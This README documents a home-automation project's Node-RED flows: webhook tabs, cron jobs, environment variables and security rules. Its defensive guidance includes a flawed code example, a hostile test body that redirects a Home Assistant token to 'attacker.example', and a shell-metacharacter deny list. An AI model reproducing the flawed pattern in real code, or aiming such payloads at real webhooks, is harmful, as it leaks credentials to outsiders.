# PuffPAI Node-RED Flows

`flows.json` is a Node-RED **flows array** with 15 tabs, one per automation. The
tab label is the config webhook key (`config/puffpai_config.json` →
`nodered.webhooks`).

Import it via Node-RED's menu → **Import → clipboard**, paste the file contents,
and choose **new flows**.

## Tabs

| Tab | Trigger | Webhook path | Upstream calls |
| --- | --- | --- | --- |
| `calendar_sync` | HTTP POST | `/webhook/calendar-sync` | `PUFFPAI_API_URL/apps/calendar/data` |
| `daily_briefing` | HTTP POST | `/webhook/daily-briefing` | api.weather.gov points + forecast, `PUFFPAI_API_URL/apps/calendar/data`, `NEWS_RSS_URL` |
| `daily_news` | HTTP POST | `/webhook/daily-news` | `NEWS_RSS_URL` |
| `daily_weather` | HTTP POST | `/webhook/daily-weather` | api.weather.gov points, forecast, active alerts |
| `grocery_list` | HTTP POST | `/webhook/grocery-list` | `PUFFPAI_API_URL/apps/freshtable/data` |
| `health_check` | HTTP POST **+ cron** `*/5 * * * *` | `/webhook/health-check` | `PUFFPAI_API_URL/health`, `OLLAMA_URL/api/tags`, `HA_URL/api/`; `PUFFPAI_API_URL/agents/event` (cron path only) |
| `meal_planner` | HTTP POST | `/webhook/meal-planner` | `PUFFPAI_API_URL/apps/freshtable/data` |
| `media_now_playing` | HTTP POST | `/webhook/media-now-playing` | `JELLYFIN_URL/Sessions`, `JELLYFIN_URL/Items/Counts` |
| `network_scan` | HTTP POST **+ cron** `*/15 * * * *` | `/webhook/network-scan` | `PUFFPAI_API_URL/firewall/devices` (cron path only) |
| `block_device` | HTTP POST | `/webhook/block-device` | `PUFFPAI_API_URL/firewall/{block,unblock,lockdown}` |
| `weather_alerts` | HTTP POST **+ cron** `0 */2 * * *` | `/webhook/weather-alerts` | api.weather.gov active alerts; `PUFFPAI_API_URL/agents/event` (cron path only) |
| `puffpai_voice` | HTTP POST | `/webhook/puffpai_voice` | `PUFFPAI_API_URL/conversation`, `HA_URL/api/services/input_text/set_value` |
| `good_morning` | HTTP POST | `/webhook/good-morning` | `HA_URL/api/services/light/turn_on`, `HA_URL/api/states/sensor.openweathermap_temperature` |
| `leaving_home` | HTTP POST | `/webhook/leaving-home` | `HA_URL/api/services/light/turn_off` (lights only; no lock or alarm calls) |
| `security_check` | HTTP POST | `/webhook/security-check` | `HA_URL/api/states` |

Every path is byte-identical to what `AutomationClient.webhook_url(name)`
produces, i.e. to `nodered.webhooks[name]` in `config/puffpai_config.json`,
which is the contract. Most paths use **hyphens** while the tab labels and
config keys use underscores; `puffpai_voice` is the one path that uses an
underscore, matching the config.

### Cron schedules

Three tabs have one:

| Tab | `inject` node | crontab | What the cron branch does |
| --- | --- | --- | --- |
| `health_check` | `every 5 minutes` | `*/5 * * * *` | Runs the three probes; if any service is down, posts a `service_degraded` event to `PUFFPAI_API_URL/agents/event` for the agent team. A healthy run is silent, and an unchanged fault is re-reported at most every 30 minutes |
| `network_scan` | `every 15 minutes` | `*/15 * * * *` | `GET PUFFPAI_API_URL/firewall/devices`, reshapes the result into the same `{devices, count}` body `network_scanner.py` posts, then runs the identical classification pipeline and logs a one-line summary |
| `weather_alerts` | `every 2 hours` | `0 */2 * * *` | Fetches NOAA active alerts for `WEATHER_DEFAULT_LAT`/`LON` (skipped with a log line when they are unset) through the same pipeline as the webhook; if there are alerts, posts a `weather_alert` event to `PUFFPAI_API_URL/agents/event` |

A cron-injected message has **no `msg.res`**, so it must never reach an
`http response` node. Each of these tabs ends in a `respond or log` **switch** on
`msg.res` (`nnull` → `http response`, `null` → a terminal branch that logs or
posts the agent event and returns `null`). The catch handler feeds the same
switch, so a failed scheduled run is logged rather than answered.

Apart from `weather_alerts`' call to api.weather.gov (no credential, and only
after the `weather` switch answers yes, see rule 5), the only outbound calls a
cron branch makes go to `PUFFPAI_API_URL`. If you add
another, re-check **Credential/host pairing** first.

If you want a schedule on another tab, copy this shape: `inject` →
`prep …` → existing pipeline → `respond or log` switch. Wiring an `inject`
straight into an `http response` path will log "no response object" on every
tick. Set the inject's `payloadType` to `json` with `payload` `"{}"` (not the
default `date`), or the `prep` node's `typeof msg.payload === "object"` guard
will accept the `Date` object.

## Environment variables

Set these in the Node-RED environment (the `environment:` block of
`docker-compose.nodered.yml`, filled from the `.env` next to it, or `docker run -e`). Node-RED's `settings.js` →
`functionGlobalContext` is *not* enough: these are read with `env.get()`, so
they must be real process env vars. All have safe fallbacks except the secrets.

| Variable | Used by | Default if unset | Notes |
| --- | --- | --- | --- |
| `PUFFPAI_API_KEY` | block_device, calendar_sync, daily_briefing, daily_news, daily_weather, grocery_list, health_check, meal_planner, network_scan, puffpai_voice, weather_alerts | `""` (header omitted) | **Secret.** Sent as `X-API-Key`, and **only** to `PUFFPAI_API_URL`, never to a host from the request body. Without it the Bridge switch check (rule 5) gets no clear yes, so the weather and news tabs make no outside call. In calendar_sync / daily_briefing / grocery_list / meal_planner a per-request `api_key` field in the POST body takes precedence; the other tabs accept **no** body override. |
| `PUFFPAI_API_URL` | block_device, calendar_sync, daily_briefing, daily_news, daily_weather, grocery_list, health_check, meal_planner, network_scan, puffpai_voice, weather_alerts | `http://localhost:8000` | |
| `NEWS_RSS_URL` | daily_news, daily_briefing | `""` (unset: no feed ships enabled) | A feed you choose. While it is empty both news flows return `null` at the first node and make no outbound request; once set, each fetch still needs the `news_rss` Bridge switch open (rule 5). See the *Feeds you enable yourself* comment on the `daily_news` tab. |
| `WEATHER_DEFAULT_LAT` | daily_briefing, daily_weather, weather_alerts | `""` (unset) | Used when the request carries no valid `lat`. With neither, the weather call is skipped (see **Weather coordinates**). |
| `WEATHER_DEFAULT_LON` | daily_briefing, daily_weather, weather_alerts | `""` (unset) | Used when the request carries no valid `lon`. With neither, the weather call is skipped (see **Weather coordinates**). |
| `PUFFPAI_USER_AGENT` | daily_briefing, daily_news, daily_weather, weather_alerts | `PuffPAI/1.0 (node-red)` | api.weather.gov requires a User-Agent. |
| `OLLAMA_URL` | health_check | `http://localhost:11435` | |
| `HA_URL` | good_morning, health_check, leaving_home, puffpai_voice, security_check | `homeassistant.local:8123` | Scheme optional; `http://` is prefixed if absent. In `health_check` (read-only) a `ha_url` body field wins, but see **Credential/host pairing** below: it also drops `HA_TOKEN`. In the four state-changing tabs a body `ha_url` is **ignored entirely**. |
| `HA_TOKEN` | good_morning, health_check, leaving_home, puffpai_voice, security_check | `""` (header omitted) | **Secret.** Long-lived HA token, sent as `Authorization: Bearer …`, and **only** to `HA_URL`. It is *never* sent to a `ha_url` from the request body. |
| `JELLYFIN_URL` | media_now_playing | `http://127.0.0.1:8096` | Whatever address Jellyfin answers on **as seen from the container**; see `.env.example`. |
| `JELLYFIN_API_KEY` | media_now_playing | `""` | **Secret.** Goes into the `X-Emby-Authorization` `Token="…"` field. Sent only to `JELLYFIN_URL`; the body cannot redirect it. |

`flows.json` contains **no secret values**, only `env.get(...)` lookups.

## Security rules these flows must keep

The `http in` nodes are **unauthenticated**: anything that can reach port 1880
can POST to any `/webhook/…` path with an arbitrary JSON body. Treat every
`msg.payload` field as attacker-controlled. The rules below are load-bearing: a
future edit that breaks one of them leaks a credential or widens what a caller
can do.

### 1. Credential/host pairing (same trust domain)

**A credential may only be sent to a host from the same source as the
credential.** Concretely:

| Host comes from | Credential allowed |
| --- | --- |
| request body (e.g. `body.ha_url`) | the matching **body** field only (`body.ha_token`), and if the body has none, **no auth header at all** |
| env / config / hardcoded default | the **env** secret (`HA_TOKEN`, `PUFFPAI_API_KEY`, `JELLYFIN_API_KEY`) |

Independent `||` fallback chains are what break this, because they let the two
values resolve from *different* sources:

```js
// WRONG: a body-supplied host silently keeps the env token:
let host    = b.ha_url   || env.get("HA_URL");
const token = b.ha_token || env.get("HA_TOKEN");
// POST {"ha_url":"http://attacker.example"} -> the long-lived HA token is
// sent to attacker.example.

// RIGHT: resolve host and token together, in one branch:
if (bodyHost) { host = bodyHost; token = bodyToken; }
else          { host = env.get("HA_URL") || "homeassistant.local:8123";
                token = env.get("HA_TOKEN"); }
```

`prep Home Assistant check` (tab `health_check`) is the only node that accepts a
host from the body, and it implements the branch above. Every other
credential-bearing node takes its URL from env/config **only**; do not add a
body override to any of them. `PUFFPAI_API_KEY` in particular must only ever go
to `PUFFPAI_API_URL` (default `http://localhost:8000`).

Body-supplied strings that end up in a URL or a header are also type-checked
and rejected if they contain control characters, so a `ha_token` cannot smuggle
a CRLF into the outbound request. The same `clean()` guard is applied to the
**env** values too: a `HA_URL` carrying a CRLF falls back to the default rather
than being spliced into the request line.

#### State-changing tabs take *nothing* from the body

`good_morning`, `leaving_home`, `security_check` and `puffpai_voice` turn lights
on and off and write an HA `input_text` entity. For those four there is **no
body-host branch at all**, not even the "body host + body token" one that
`health_check` allows. The host is always `env HA_URL`, the credential is always
`env HA_TOKEN`, and every `entity_id` is a literal in the flow. A caller cannot
redirect a state-changing call at another Home Assistant, and cannot aim it at a
different entity.

The only caller-controlled value in the four is `good_morning`'s `brightness`,
which is coerced to a number and clamped to 1–100 (default 70).

`weather_alerts` calls a **third-party** host (api.weather.gov), so it carries no
credential at all, neither `PUFFPAI_API_KEY` nor `HA_TOKEN`. The lat/lon are
range-checked numbers and URL-encoded; the caller's `location` string is echoed
back in the response but never interpolated into a URL.

### 2. Clear `msg.headers` before every `http response`

Node-RED's `http response` node sends `msg.headers` as the **response** headers.
The `prep …` nodes put credentials in `msg.headers` for the outbound call, and a
request that fails at the connection level never gets overwritten with the
upstream *response* headers, so the `catch` handler would forward a message
still carrying `Authorization` / `X-API-Key` / `X-Emby-Authorization`, and the
webhook caller would receive the credential in the response headers.

Every `function` node wired to an `http response` node therefore ends with
`delete msg.headers;`. **Any new response path needs the same line.** This also
avoids echoing a stale upstream `Content-Length`/`Content-Type` at the caller.

### 3. Read-only by construction

`calendar_sync` takes a caller-supplied `body.method`, but the method is
allow-listed to `GET`/`HEAD` and fails closed to `GET`. Because this request
carries the env `PUFFPAI_API_KEY`, an unfiltered method would let an
unauthenticated caller borrow that key for a write against
`/apps/calendar/data`. If a flow ever genuinely needs to write, give it its own
tab and require a body-supplied `api_key` rather than widening this allow-list.

### 4. `block_device` validates the IP before the firewall call

`block_device` mutates the host firewall and is reachable from an
unauthenticated POST. Its first-party caller chain is
`src/puffpai/assistant_tools.py` (`privacy_block_device`, `privacy_unblock_device`,
`privacy_lockdown_mode`), which pass an IP regex-scraped out of **LLM tool
input**. `parse and validate request` therefore re-implements the checks in
`src/puffpai/firewall_manager.py::validate_ip` *inside the flow*:

* must be a `string` (no `Number`, no object with a `toString`);
* trimmed, non-empty, and free of the shell-metacharacter set
  ``; & | ` $ ( ) { } [ ] < > ! # ' " \ % \n \r \t`` and space;
* four dotted decimal octets, 0–255, no leading zeros;
* rejected if loopback (`127/8`), multicast (`224/4`), link-local
  (`169.254/16`), unspecified (`0.0.0.0`), broadcast (`255.255.255.255`) or
  reserved (`240/4`).

It is one notch **tighter** than the Python: IPv6 is rejected outright, because
every caller and every firewall rule in this project is IPv4.

Anything that fails answers **400** with `{"error":"invalid_request", …}` and
makes **no backend call**: `msg.url` is never set. That is also the correct
outcome for the LLM path: `AutomationClient.call()` counts only HTTP 200 as
success, so a rejection here falls through to the local firewall backend, which
runs the same validation again. Validating in the flow is defence in depth, not
a replacement for `firewall_manager.py`.

The `reason` field has control characters stripped and is capped at 200
characters, because the backend stores and logs it. For `lockdown`, the
caller's `enable` boolean is passed through, failing closed to `true` for
anything that is not an explicit `false`/`"false"`.

The `action` switch has an explicit `otherwise` branch wired to a 400 response,
so a future edit cannot make a message vanish and hang the caller.

### 5. Outbound calls ask their Bridge switch first

Every `prep …` node that is about to reach the internet asks the backend
whether its Bridge switch is on, and hands the message to its `http request`
node only on a clear yes:

| Tab | Nodes | Switch | Destination |
| --- | --- | --- | --- |
| `daily_briefing` | `prep NWS points`, `prep forecast` | `weather` | api.weather.gov |
| `daily_briefing` | `prep news feed` | `news_rss` | `NEWS_RSS_URL` |
| `daily_news` | `prep RSS fallback request` | `news_rss` | `NEWS_RSS_URL` |
| `daily_weather` | `prep NWS points`, `prep forecast`, `prep active alerts` | `weather` | api.weather.gov |
| `weather_alerts` | `prep NOAA alerts request` | `weather` | api.weather.gov |

The question is `GET PUFFPAI_API_URL/system/egress/door/<switch>` with the env
`PUFFPAI_API_KEY` (never a body key), made with Node's `http`/`https` modules,
which each of these nodes loads in its **Setup** tab (`bridgeHttp`,
`bridgeHttps`). Only `200` with `{"success": true, "id": <switch>, "open": true}`
is a yes. A closed switch, a missing or wrong key, an unreachable or slow
backend (5 s) and any other answer are a no: the node logs the reason and
returns `null`. On a webhook run it also raises the reason with
`node.error(reason, msg)`, and the tab's `catch` node (whose scope includes
these nodes) answers the caller, so nothing hangs. A scheduled run only logs.

`prep forecast` also refuses a forecast address outside
`https://api.weather.gov/`, because that address comes from the points answer.

This needs function-node modules enabled, which is Node-RED's default. With
`functionExternalModules: false` in `settings.js` these nodes do not start, and
the weather and news tabs make no outside call.

The backend applies the same switches before it starts a flow
(`WEBHOOK_SWITCHES` in `src/puffpai/automation_client.py`), but the check here
is what covers the `weather_alerts` schedule and anything else that calls a
webhook directly. A copy of these flows without the check (no `askBridge` in
these nodes) does not ask: re-import the file.

## Flow structure

| Pattern | How it is built |
| --- | --- |
| Webhook | `http in` (POST) + `http response` |
| Outbound HTTP call | `function` (`prep …`) that sets `msg.url` / `msg.method` / `msg.headers` / `msg.requestTimeout`, then `http request` |
| Parallel branches | multiple wires out of one node, re-joined by a `join` node in *custom / object* mode keyed on `msg.topic` (`health_check` uses its own per-run collector instead, see below) |
| Two-way branch | `switch` with a comparison rule + an `else` rule |
| N-way branch | `switch` with N `eq`/`str` rules **plus an explicit `else`** wired to a 400 response, so nothing is silently dropped |
| Schedule | `inject` with `crontab` set and `repeat` empty, plus a `respond or log` switch (see **Cron schedules**) |
| Credentials | `env.get("…")` in the `prep …` node; the credential never appears in `flows.json` |

`http request` nodes have an empty `url` on purpose: the URL comes from
`msg.url`, set by the preceding `prep …` node. The `prep …` nodes also
**overwrite** `msg.headers` with a fresh object, so the inbound webhook's own
headers are never forwarded upstream, and `delete msg.payload` so the GET
requests carry no body. Symmetrically, the last `function` node on every
response path **deletes** `msg.headers` so the outbound credential headers are
never returned to the caller (see **Security rules these flows must keep**).

### Structural nodes

1. **`join branches` (join node): daily_briefing, daily_weather,
   media_now_playing.** Each branch tags itself with `msg.topic` and the `join`
   node rebuilds them into one object (`msg.payload.weather`, `.calendar`,
   `.news`, …) for the compile `function` node. The join has a **20 s
   timeout**: if a branch never produces a message the join emits with only the
   branches it got, and the compile node falls back to its `|| {}` defaults.
2. **`stamp run id` → `one part per branch per run` → `collect per run`:
   health_check.** Concurrent runs (webhook and cron) must not share one join
   group, so every run gets an id, each branch contributes at most one part per
   run, and the collector keeps a separate bucket and 20 s timer per run. A
   branch missing at the timeout is marked as a plumbing fault and reported as
   `unknown`, never as `down`.
3. **`on request error` (catch node) + `request failed` / `branch failed`
   functions: all fifteen tabs.**
   - linear tabs answer the webhook with HTTP **502** and
     `{"error":"upstream_request_failed","detail":…}` so the client never hangs;
   - branching tabs feed the join or collector instead, with that branch's
     payload set to `{"__error":"…"}`, so one dead service is reported as
     `status: "down"` instead of sinking the whole report.
4. **`points error?` (switch node): daily_weather.** The points lookup is
   *before* the fan-out, so a failure there has no `msg.topic` and must not be
   sent to the join. The switch routes on `msg.statusCode` being set: set →
   respond 502 directly, unset → forward to the join.
5. **`prep forecast` no-URL guard: daily_briefing, daily_weather.** If
   api.weather.gov returns a points document without `properties.forecast`, the
   branch is dropped with a `node.warn` and the join times out.
6. **`respond or log` (switch node) + terminal functions: health_check,
   network_scan, weather_alerts.** See **Cron schedules**.
7. **`unsupported action` (function): block_device.** The `else` output of the
   action switch. Unreachable while `parse and validate request` allow-lists
   the action first; it exists so the switch can never drop a message and hang
   the caller.

## Behaviour notes

- **Weather coordinates.** `daily_weather`, `daily_briefing` and
  `weather_alerts` read `lat`/`lon` from the body and fall back to
  `WEATHER_DEFAULT_LAT` / `WEATHER_DEFAULT_LON`. There are no built-in
  coordinates: with neither, the `prep` node logs "no coordinates set" and
  skips the api.weather.gov call. `daily_briefing` then reports the weather as
  unavailable, `daily_weather` and the `weather_alerts` webhook answer HTTP
  **422** `{"error":"location_unset",…}`, and the scheduled `weather_alerts`
  run stops there. (The skip leaves `msg.url` unset, so the request node raises
  its "no url" error to the tab's catch node, which answers at once instead of
  waiting for a join timeout.) The assistant's alert check sends the
  household's `lat`/`lon` from config; the backend's
  `/automation/weather-alerts` route posts only `{"location": ...}` and relies
  on the defaults. `weather_alerts` guards a missing alert `description`.
- **Timeouts** are set per call with `msg.requestTimeout`: 5000 ms for the
  three `health_check` probes and the Home Assistant calls in `good_morning`,
  `leaving_home` and `puffpai_voice`, 10000 ms for the Jellyfin, NWS
  points/forecast and `security_check` calls, 15000 ms for the NOAA alerts,
  firewall and agent-event calls, and 120000 ms for `puffpai_voice`'s
  `/conversation` call.
- **RSS requests** (`daily_news`, `daily_briefing`) use `ret: "txt"` so the
  regex-based title extraction receives a string.
- **`network_scan`** carries the per-device report alongside on
  `msg.device_report` and keeps the classification on `msg.payload` /
  `msg.classification`, so the `unknown devices?` switch always routes and the
  caller always gets an answer, including when nothing needs review. Every
  device field is coerced with `String(... || '')`, so a malformed entry is
  classified rather than crashing the flow.
- **`block_device`** reports the real outcome (200 / 400 / 502).
  `AutomationClient.call()` treats any non-200 as failure and falls back to the
  local firewall, so an honest status is what makes that fallback correct.
- **`puffpai_voice`** sends `X-API-Key` to `/conversation` (only ever to
  `PUFFPAI_API_URL`), writes the reply to `input_text.puffpai_last_reply` with
  `Authorization: Bearer $HA_TOKEN`, and answers with the text it received
  (`received_text`, carried on `msg.voice_text` past the HA call).

## Checking the file

These invariants hold for `flows.json` and should be re-checked after an edit:

- It parses as a JSON **list** (15 `tab` objects plus the nodes).
- Every node's `z` matches an existing tab id; every id in every `wires`
  array and every `catch` `scope` array exists and lives on the same tab.
- Node ids are unique.
- Every node is reachable (only `http in`, `inject` and `catch` nodes are
  un-targeted). Every `function`/`switch` node's `outputs` count matches the
  length of its `wires` array.
- Every `function` node body parses as valid JavaScript (`node --check`).
- Every `function` node that names `api.weather.gov`, the points answer's
  forecast address or `NEWS_RSS_URL` asks its Bridge switch first and is in its
  tab's `catch` scope (rule 5; `tests/test_egress_nodered_flows.py` runs these
  bodies against a stand-in backend).
- No secret-like literals are present.
- Every credential-bearing `prep …` node, run against a stub `env` holding
  marker tokens with `{"ha_url":"http://attacker.example","ha_token":"ATTACKER-TOKEN"}`
  and similar hostile fields in the body, sends the env token only to the env
  host.
- `parse and validate request` accepts only well-formed unicast IPv4 addresses;
  every rejection sets `statusCode` 400, clears `msg.headers`, and leaves
  `msg.url` **unset**.
- Every `function` node wired to an `http response` node, directly or through
  the `respond or log` switch, contains `delete msg.headers;`.
- Every `http in` path equals `nodered.webhooks[<name>]` in
  `config/puffpai_config.json`, and no `http in` node serves a path outside that
  map (`tests/test_automation_client.py` covers the backend side of the map).
